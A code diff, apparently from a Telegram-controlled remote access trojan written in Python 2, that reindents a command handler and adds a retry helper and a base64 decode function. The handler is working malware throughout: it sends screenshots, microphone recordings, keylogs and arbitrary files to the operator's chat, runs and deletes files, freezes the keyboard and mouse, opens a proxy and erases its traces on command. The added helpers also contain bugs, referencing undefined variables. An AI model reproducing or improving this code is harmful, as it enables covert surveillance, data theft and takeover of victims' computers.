@@ -84,6 +84,15 @@ def encode(file):
 	t = open(file, "w+")
 	t.write(string)
 	t.close()
+def decode(file):
+	f = open(file)
+	data = f.read()
+	f.close()
+	#string = base64.b64encode(data)
+	string = base64.b64decode(string)
+	t = open(file, "w+")
+	t.write(string)
+	t.close()
 def runStackedSchedule(everyNSeconds):
 	for k in schedule.keys():
 		if k < datetime.datetime.now():
@@ -123,256 +132,268 @@ def split_string(n, st):
 			lst += [i]
 	return lst
 
+def send_safe_message(bot, chat_id, message):
+	sent = False
+	while(not sent):
+		try:
+			bot.sendMessage(chat_id, resp)
+			sent = True
+		except:
+			pass
+	
 def handle(msg):
 	chat_id = msg['chat']['id']
 	if checkchat_id(chat_id):
 		if 'text' in msg:
-			print '\t\tGot message from ' + str(chat_id) + ': ' + msg['text']
-			command = msg['text']
-			response = ''
-			if command == '/arp':
+			try:
+				print '\t\tGot message from ' + str(chat_id) + ': ' + msg['text']
+				command = msg['text']
 				response = ''
-				bot.sendChatAction(chat_id, 'typing')
-				lines = os.popen('arp -a -N ' + internalIP())
-				for line in lines:
-					line.replace('\n\n', '\n')
-					response += line
-			elif command == '/capture_pc':
-				bot.sendChatAction(chat_id, 'typing')
-				screenshot = ImageGrab.grab()
-				screenshot.save('screenshot.jpg')
-				bot.sendChatAction(chat_id, 'upload_photo')
-				bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
-				os.remove('screenshot.jpg')
-			elif command.startswith('/cd'):
-				command = command.replace('/cd ','')
-				try:
-					os.chdir(command)
-					response = os.getcwd() + '>'
-				except:
-					response = 'No subfolder matching ' + command
-			elif command.startswith('/delete'):
-				command = command.replace('/delete', '')
-				path_file = command.strip()
-				try:
-					os.remove(path_file)
-					response = 'Succesfully removed file'
-				except:
-					try:
-						os.rmdir(path_file)
-						response = 'Succesfully removed folder'
-					except:
-						try:
-							shutil.rmtree(path_file)
-							response = 'Succesfully removed folder and it\'s files'
-						except:
-							response = 'File not found'
-			elif command.startswith('/download'):
-				bot.sendChatAction(chat_id, 'typing')
-				path_file = command.replace('/download', '')
-				path_file = path_file[1:]
-				if path_file == '':
-					response = '/download C:/path/to/file.name or /download file.name'
-				else:
-					bot.sendChatAction(chat_id, 'upload_document')
-					try:
-						bot.sendDocument(chat_id, open(path_file, 'rb'))
-					except:
-						try:
-							bot.sendDocument(chat_id, open(hide_folder + '\\' + path_file))
-							response = 'Found in hide_folder: ' + hide_folder
-						except:
-							response = 'Could not find ' + path_file
-			elif command == '/encrypt_all': #WIP
-				response = 'Not implemented'
-			elif command.endswith('freeze_keyboard'):
-				global keyboardFrozen
-				keyboardFrozen = not command.startswith('/un')
-				hookManager.KeyAll = lambda event: not keyboardFrozen
-				response = 'Keyboard is now '
-				if keyboardFrozen:
-					response += 'disabled. To enable, use /unfreeze_keyboard'
-				else:
-					response += 'enabled'
-			elif command.endswith('freeze_mouse'):
-				global mouseFrozen
-				mouseFrozen = not command.startswith('/un')
-				hookManager.MouseAll = lambda event: not mouseFrozen
-				hookManager.HookMouse()
-				response = 'Mouse is now '
-				if mouseFrozen:
-					response += 'disabled. To enable, use /unfreeze_mouse'
-				else:
-					response += 'enabled'
-			elif command.startswith('/hear'):
-				SECONDS = -1
-				try:
-					SECONDS = int(command.replace('/hear','').strip())
-				except:
-					SECONDS = 5
-				 
-				CHANNELS = 2
-				CHUNK = 1024
-				FORMAT = pyaudio.paInt16
-				RATE = 44100
-				 
-				audio = pyaudio.PyAudio()
-				bot.sendChatAction(chat_id, 'typing')
-				stream = audio.open(format=FORMAT, channels=CHANNELS,
-								rate=RATE, input=True,
-								frames_per_buffer=CHUNK)
-				frames = []
-				for i in range(0, int(RATE / CHUNK * SECONDS)):
-					data = stream.read(CHUNK)
-					frames.append(data)
-				stream.stop_stream()
-				stream.close()
-				audio.terminate()
-				
-				wav_path = hide_folder + '\\mouthlogs.wav'
-				waveFile = wave.open(wav_path, 'wb')
-				waveFile.setnchannels(CHANNELS)
-				waveFile.setsampwidth(audio.get_sample_size(FORMAT))
-				waveFile.setframerate(RATE)
-				waveFile.writeframes(b''.join(frames))
-				waveFile.close()
-				bot.sendChatAction(chat_id, 'upload_document')
-				bot.sendAudio(chat_id, audio=open(wav_path, 'rb'))
-			elif command == '/ip_info':
-				bot.sendChatAction(chat_id, 'find_location')
-				info = requests.get('http://ipinfo.io').text #json format
-				location = (loads(info)['loc']).split(',')
-				bot.sendLocation(chat_id, location[0], location[1])
-				import string
-				import re
-				response = 'External IP: ' 
-				response += "".join(filter(lambda char: char in string.printable, info))
-				response = re.sub('[:,{}\t\"]', '', response)
-				response += '\n' + 'Internal IP: ' + '\n\t' + internalIP()
-			elif command == '/keylogs':
-				bot.sendChatAction(chat_id, 'upload_document')
-				bot.sendDocument(chat_id, open(log_file, "rb"))
-			elif command.startswith('/ls'):
-				bot.sendChatAction(chat_id, 'typing')
-				command = command.replace('/ls', '')
-				command = command.strip()
-				files = []
-				if len(command) > 0:
-					files = os.listdir(command)
-				else:
-					files = os.listdir(os.getcwd())
-				human_readable = ''
-				for file in files:
-					human_readable += file + '\n'
-				response = human_readable
-			elif command.startswith('/msg_box'):
-				message = command.replace('/msg_box', '')
-				if message == '':
-					response = '/msg_box yourText'
-				else:
-					ctypes.windll.user32.MessageBoxW(0, message, u'Information', 0x40)
-					response = 'MsgBox displayed'
-			elif command == '/pc_info':
-				bot.sendChatAction(chat_id, 'typing')
-				info = ''
-				for pc_info in platform.uname():
-					info += '\n' + pc_info
-				info += '\n' + 'Username: ' + getpass.getuser()
-				response = info
-			elif command.startswith('/play'):
-				command = command.replace('/play ', '')
-				command = command.strip()
-				if len(command) > 0:
-					systemCommand = 'start \"\" \"https://www.youtube.com/embed/'
-					systemCommand += command
-					systemCommand += '?autoplay=1&showinfo=0&controls=0\"'
-					if os.system(systemCommand) == 0:
-						response = 'YouTube video is now playing'
-					else:
-						response = 'Failed playing YouTube video'
-				else:
-					response = '/play <VIDEOID>\n/play A5ZqNOJbamU'
-			elif command == '/proxy':
-				threading.Thread(target=proxy.main).start()
-				info = requests.get('http://ipinfo.io').text #json format
-				ip = (loads(info)['ip'])
-				response = 'Proxy succesfully setup on ' + ip + ':8081'
-			elif command == '/pwd':
-				response = os.getcwd()
-			elif command.startswith('/run'):
-				bot.sendChatAction(chat_id, 'typing')
-				path_file = command.replace('/run', '')
-				path_file = path_file[1:]
-				if path_file == '':
-					response = '/run_file C:/path/to/file'
-				else:
-					try:
-						os.startfile(path_file)
-						response = 'File ' + path_file + ' has been run'
-					except:
-						try:
-							os.startfile(hide_folder + '\\' + path_file)
-							response = 'File ' + path_file + ' has been run from hide_folder'
-						except:
-							response = 'File not found'
-			elif command.startswith('/schedule'):
-				command = command.replace('/schedule', '')
-				if command == '':
-					response = '/schedule 2017 12 24 23 59 /msg_box happy christmas'
-				else:
-					scheduleDateTimeStr = command[1:command.index('/') - 1]
-					scheduleDateTime = datetime.datetime.strptime(scheduleDateTimeStr, '%Y %m %d %H %M')
-					scheduleMessage = command[command.index('/'):]
-					schedule[scheduleDateTime] = {'text' : scheduleMessage, 'chat' : { 'id' : chat_id }}
-					response = 'Schedule set: ' + scheduleMessage
-					runStackedSchedule(10)
-			elif command == '/self_destruct':
-				bot.sendChatAction(chat_id, 'typing')
-				global initi
-				initi = True
-				response = 'You sure? Type \'destroy!\' to proceed.'
-			elif command == 'destroy!' and initi == True:
-				bot.sendChatAction(chat_id, 'typing')
-				response = 'Destroying all traces!'
-				if os.path.exists(hide_folder):
-					for file in os.listdir(hide_folder):
-						try:
-							os.remove(hide_folder + '\\' + file)
-						except:
-							pass
-				if os.path.isfile(target_shortcut):
-					os.remove(target_shortcut)
-				while True:
-					sleep(10)
-			elif command == '/tasklist':
-				lines = os.popen('tasklist /FI \"STATUS ne NOT RESPONDING\"')
-				response2 = ''
-				for line in lines:
-					line.replace('\n\n', '\n')
-					if len(line)>2000:
-						response2 +=line
-					else:
+				if command == '/arp':
+					response = ''
+					bot.sendChatAction(chat_id, 'typing')
+					lines = os.popen('arp -a -N ' + internalIP())
+					for line in lines:
+						line.replace('\n\n', '\n')
 						response += line
-				response += '\n' + response2
-			elif command.startswith('/to'):
-				command = command.replace('/to','')
-				if command == '':
-					response = '/to <COMPUTER_1_NAME>, <COMPUTER_2_NAME> /msg_box Hello HOME-PC and WORK-PC'
-				else:
-					targets = command[:command.index('/')]
-					if platform.uname()[1] in targets:
-						command = command.replace(targets, '')
-						msg = {'text' : command, 'chat' : { 'id' : chat_id }}
-						handle(msg)
-			elif command == '/help':
-				response = "\n".join(command + ' ' + description for command,description in sorted(functionalities.items()))
-			else: # redirect to /help
-				msg = {'text' : '/help', 'chat' : { 'id' : chat_id }}
+				elif command == '/capture_pc':
+					bot.sendChatAction(chat_id, 'typing')
+					screenshot = ImageGrab.grab()
+					screenshot.save('screenshot.jpg')
+					bot.sendChatAction(chat_id, 'upload_photo')
+					bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
+					os.remove('screenshot.jpg')
+				elif command.startswith('/cd'):
+					command = command.replace('/cd ','')
+					try:
+						os.chdir(command)
+						response = os.getcwd() + '>'
+					except:
+						response = 'No subfolder matching ' + command
+				elif command.startswith('/delete'):
+					command = command.replace('/delete', '')
+					path_file = command.strip()
+					try:
+						os.remove(path_file)
+						response = 'Succesfully removed file'
+					except:
+						try:
+							os.rmdir(path_file)
+							response = 'Succesfully removed folder'
+						except:
+							try:
+								shutil.rmtree(path_file)
+								response = 'Succesfully removed folder and it\'s files'
+							except:
+								response = 'File not found'
+				elif command.startswith('/download'):
+					bot.sendChatAction(chat_id, 'typing')
+					path_file = command.replace('/download', '')
+					path_file = path_file[1:]
+					if path_file == '':
+						response = '/download C:/path/to/file.name or /download file.name'
+					else:
+						bot.sendChatAction(chat_id, 'upload_document')
+						try:
+							bot.sendDocument(chat_id, open(path_file, 'rb'))
+						except:
+							try:
+								bot.sendDocument(chat_id, open(hide_folder + '\\' + path_file))
+								response = 'Found in hide_folder: ' + hide_folder
+							except:
+								response = 'Could not find ' + path_file
+				elif command == '/encrypt_all': #WIP
+					response = 'Not implemented'
+				elif command.endswith('freeze_keyboard'):
+					global keyboardFrozen
+					keyboardFrozen = not command.startswith('/un')
+					hookManager.KeyAll = lambda event: not keyboardFrozen
+					response = 'Keyboard is now '
+					if keyboardFrozen:
+						response += 'disabled. To enable, use /unfreeze_keyboard'
+					else:
+						response += 'enabled'
+				elif command.endswith('freeze_mouse'):
+					global mouseFrozen
+					mouseFrozen = not command.startswith('/un')
+					hookManager.MouseAll = lambda event: not mouseFrozen
+					hookManager.HookMouse()
+					response = 'Mouse is now '
+					if mouseFrozen:
+						response += 'disabled. To enable, use /unfreeze_mouse'
+					else:
+						response += 'enabled'
+				elif command.startswith('/hear'):
+					SECONDS = -1
+					try:
+						SECONDS = int(command.replace('/hear','').strip())
+					except:
+						SECONDS = 5
+					 
+					CHANNELS = 2
+					CHUNK = 1024
+					FORMAT = pyaudio.paInt16
+					RATE = 44100
+					 
+					audio = pyaudio.PyAudio()
+					bot.sendChatAction(chat_id, 'typing')
+					stream = audio.open(format=FORMAT, channels=CHANNELS,
+									rate=RATE, input=True,
+									frames_per_buffer=CHUNK)
+					frames = []
+					for i in range(0, int(RATE / CHUNK * SECONDS)):
+						data = stream.read(CHUNK)
+						frames.append(data)
+					stream.stop_stream()
+					stream.close()
+					audio.terminate()
+					
+					wav_path = hide_folder + '\\mouthlogs.wav'
+					waveFile = wave.open(wav_path, 'wb')
+					waveFile.setnchannels(CHANNELS)
+					waveFile.setsampwidth(audio.get_sample_size(FORMAT))
+					waveFile.setframerate(RATE)
+					waveFile.writeframes(b''.join(frames))
+					waveFile.close()
+					bot.sendChatAction(chat_id, 'upload_document')
+					bot.sendAudio(chat_id, audio=open(wav_path, 'rb'))
+				elif command == '/ip_info':
+					bot.sendChatAction(chat_id, 'find_location')
+					info = requests.get('http://ipinfo.io').text #json format
+					location = (loads(info)['loc']).split(',')
+					bot.sendLocation(chat_id, location[0], location[1])
+					import string
+					import re
+					response = 'External IP: ' 
+					response += "".join(filter(lambda char: char in string.printable, info))
+					response = re.sub('[:,{}\t\"]', '', response)
+					response += '\n' + 'Internal IP: ' + '\n\t' + internalIP()
+				elif command == '/keylogs':
+					bot.sendChatAction(chat_id, 'upload_document')
+					bot.sendDocument(chat_id, open(log_file, "rb"))
+				elif command.startswith('/ls'):
+					bot.sendChatAction(chat_id, 'typing')
+					command = command.replace('/ls', '')
+					command = command.strip()
+					files = []
+					if len(command) > 0:
+						files = os.listdir(command)
+					else:
+						files = os.listdir(os.getcwd())
+					human_readable = ''
+					for file in files:
+						human_readable += file + '\n'
+					response = human_readable
+				elif command.startswith('/msg_box'):
+					message = command.replace('/msg_box', '')
+					if message == '':
+						response = '/msg_box yourText'
+					else:
+						ctypes.windll.user32.MessageBoxW(0, message, u'Information', 0x40)
+						response = 'MsgBox displayed'
+				elif command == '/pc_info':
+					bot.sendChatAction(chat_id, 'typing')
+					info = ''
+					for pc_info in platform.uname():
+						info += '\n' + pc_info
+					info += '\n' + 'Username: ' + getpass.getuser()
+					response = info
+				elif command.startswith('/play'):
+					command = command.replace('/play ', '')
+					command = command.strip()
+					if len(command) > 0:
+						systemCommand = 'start \"\" \"https://www.youtube.com/embed/'
+						systemCommand += command
+						systemCommand += '?autoplay=1&showinfo=0&controls=0\"'
+						if os.system(systemCommand) == 0:
+							response = 'YouTube video is now playing'
+						else:
+							response = 'Failed playing YouTube video'
+					else:
+						response = '/play <VIDEOID>\n/play A5ZqNOJbamU'
+				elif command == '/proxy':
+					threading.Thread(target=proxy.main).start()
+					info = requests.get('http://ipinfo.io').text #json format
+					ip = (loads(info)['ip'])
+					response = 'Proxy succesfully setup on ' + ip + ':8081'
+				elif command == '/pwd':
+					response = os.getcwd()
+				elif command.startswith('/run'):
+					bot.sendChatAction(chat_id, 'typing')
+					path_file = command.replace('/run', '')
+					path_file = path_file[1:]
+					if path_file == '':
+						response = '/run_file C:/path/to/file'
+					else:
+						try:
+							os.startfile(path_file)
+							response = 'File ' + path_file + ' has been run'
+						except:
+							try:
+								os.startfile(hide_folder + '\\' + path_file)
+								response = 'File ' + path_file + ' has been run from hide_folder'
+							except:
+								response = 'File not found'
+				elif command.startswith('/schedule'):
+					command = command.replace('/schedule', '')
+					if command == '':
+						response = '/schedule 2017 12 24 23 59 /msg_box happy christmas'
+					else:
+						scheduleDateTimeStr = command[1:command.index('/') - 1]
+						scheduleDateTime = datetime.datetime.strptime(scheduleDateTimeStr, '%Y %m %d %H %M')
+						scheduleMessage = command[command.index('/'):]
+						schedule[scheduleDateTime] = {'text' : scheduleMessage, 'chat' : { 'id' : chat_id }}
+						response = 'Schedule set: ' + scheduleMessage
+						runStackedSchedule(10)
+				elif command == '/self_destruct':
+					bot.sendChatAction(chat_id, 'typing')
+					global initi
+					initi = True
+					response = 'You sure? Type \'destroy!\' to proceed.'
+				elif command == 'destroy!' and initi == True:
+					bot.sendChatAction(chat_id, 'typing')
+					response = 'Destroying all traces!'
+					if os.path.exists(hide_folder):
+						for file in os.listdir(hide_folder):
+							try:
+								os.remove(hide_folder + '\\' + file)
+							except:
+								pass
+					if os.path.isfile(target_shortcut):
+						os.remove(target_shortcut)
+					while True:
+						sleep(10)
+				elif command == '/tasklist':
+					lines = os.popen('tasklist /FI \"STATUS ne NOT RESPONDING\"')
+					response2 = ''
+					for line in lines:
+						line.replace('\n\n', '\n')
+						if len(line)>2000:
+							response2 +=line
+						else:
+							response += line
+					response += '\n' + response2
+				elif command.startswith('/to'):
+					command = command.replace('/to','')
+					if command == '':
+						response = '/to <COMPUTER_1_NAME>, <COMPUTER_2_NAME> /msg_box Hello HOME-PC and WORK-PC'
+					else:
+						targets = command[:command.index('/')]
+						if platform.uname()[1] in targets:
+							command = command.replace(targets, '')
+							msg = {'text' : command, 'chat' : { 'id' : chat_id }}
+							handle(msg)
+				elif command == '/help':
+					response = "\n".join(command + ' ' + description for command,description in sorted(functionalities.items()))
+				else: # redirect to /help
+					msg = {'text' : '/help', 'chat' : { 'id' : chat_id }}
+					handle(msg)
+				if response != '':
+					responses = split_string(4096, response)
+					for resp in responses:
+							send_safe_message(bot, chat_id, resp)#bot.sendMessage(chat_id, resp)
+			except MaxRetryError:
 				handle(msg)
-			if response != '':
-				responses = split_string(4096, response)
-				for resp in responses:
-					bot.sendMessage(chat_id, resp)
 		else: # Upload a file to target
 			file_name = ''
 			file_id = None
@@ -394,9 +415,9 @@ bot = telepot.Bot(token)
 bot.message_loop(handle)
 if len(known_ids) > 0:
 	helloWorld = platform.uname()[1] + ": I'm up."
-	print helloWorld
 	for known_id in known_ids:
-		bot.sendMessage(known_id, helloWorld)
+		send_safe_message(bot, known_id, helloWorld)#bot.sendMessage(known_id, helloWorld)
+	print helloWorld
 print 'Listening for commands on ' + platform.uname()[1] + '...'
 hookManager = pyHook.HookManager()
 hookManager.KeyDown = pressed_chars
